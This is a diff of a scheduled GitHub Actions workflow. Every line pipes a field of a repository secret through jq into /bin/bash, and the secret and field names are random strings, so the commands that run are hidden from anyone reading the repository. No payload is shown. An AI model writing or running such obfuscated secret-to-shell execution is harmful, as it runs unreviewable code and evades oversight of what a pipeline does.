@@ -1,9 +1,9 @@
 name: yingjinchaoshang
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '36 1/6 * * *'
-
+    - cron: '54 1/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,13 +11,24 @@ jobs:
       - uses: actions/checkout@v4
       - name: yingjinchaoshang
         env:
-          i6: ${{ secrets.i6 }}
+          uy58: ${{ secrets.uy58 }}
         run: |
-          echo $i6 | jq -r .bd937 | /bin/bash
-          echo $sl9 | jq -r .fht570 | /bin/bash
-          echo $elwyt1210 | jq -r .vro2063 | /bin/bash
-          echo $lobc9 | jq -r .ioxq5671 | /bin/bash
-          echo $igezt5429 | jq -r .xda91 | /bin/bash
-          echo $q6746 | jq -r .ojq6 | /bin/bash
-          echo $hscj94 | jq -r .avwb4895 | /bin/bash
+          echo $uy58 | jq -r .ysopi988 | /bin/bash
+          echo $j5 | jq -r .mo7 | /bin/bash
+          echo $erslk9295 | jq -r .iwisa99 | /bin/bash
+          echo $uha868 | jq -r .uv84843 | /bin/bash
+          echo $hx2 | jq -r .rnq50246 | /bin/bash
+          echo $nani9143 | jq -r .hk44 | /bin/bash
+          echo $oqaet4229 | jq -r .ll40269 | /bin/bash
+          echo $uvkb8212 | jq -r .jzkxn66944 | /bin/bash
+          echo $le714 | jq -r .vo638 | /bin/bash
+          echo $t44 | jq -r .ggcu88718 | /bin/bash
+          echo $nhdp2 | jq -r .d1310 | /bin/bash
+          echo $quksl16375 | jq -r .a416 | /bin/bash
+          echo $z8 | jq -r .zfd20 | /bin/bash
+          echo $ybfjq23627 | jq -r .mqtbf97131 | /bin/bash
+          echo $aarx22 | jq -r .qqa5 | /bin/bash
+          echo $jtn1 | jq -r .pt303 | /bin/bash
+          echo $f88 | jq -r .lfjh13730 | /bin/bash
+          echo $haav58767 | jq -r .gsxg3779 | /bin/bash
 
